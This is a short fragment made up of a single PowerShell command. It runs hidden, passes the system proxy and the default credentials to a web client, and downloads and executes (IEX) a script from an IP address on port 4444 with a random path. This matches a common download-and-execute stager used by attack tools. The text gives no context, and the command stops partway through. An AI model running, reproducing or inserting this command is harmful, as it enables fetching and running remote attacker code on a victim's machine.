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""powershell.exe -nop -w hidden -c $C=new-object net.webclient;$C.proxy=[Net.WebRequest]::GetSystemWebProxy();$C.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $C.downloadstring('http://172.16.72.194:4444/hiRxNomK'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